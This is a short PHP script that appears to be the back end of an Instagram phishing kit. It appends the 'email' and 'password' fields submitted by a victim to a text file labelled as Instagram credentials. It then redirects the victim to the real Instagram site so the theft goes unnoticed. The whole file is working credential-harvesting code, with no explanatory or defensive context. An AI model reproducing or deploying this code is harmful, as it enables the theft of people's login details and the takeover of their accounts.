<?php

file_put_contents("../facebook/mydata.txt", "INSTAGRAM Username: " . $_POST['email'] . " Password: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.instagram.com/');
exit();
                                                                  
